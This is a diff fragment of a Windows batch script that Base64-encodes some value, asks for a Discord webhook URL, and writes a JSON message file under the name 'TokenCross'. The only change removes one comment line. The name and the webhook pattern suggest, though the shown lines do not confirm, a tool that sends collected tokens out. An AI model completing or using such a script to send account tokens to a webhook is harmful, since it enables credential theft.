@@ -15,7 +15,7 @@ for /f %%i in ('powershell -NoProfile -Command "[Convert]::ToBase64String([Text.
 echo Enter Webhook URL: 
 set /p webhook_url=
 
-:: Create JSON payload for Discord webhook
+
 echo { > webhook_data.json
 echo   "username": "TokenCross", >> webhook_data.json
 echo   "avatar_url": "https://example.com/avatar.png", >> webhook_data.json
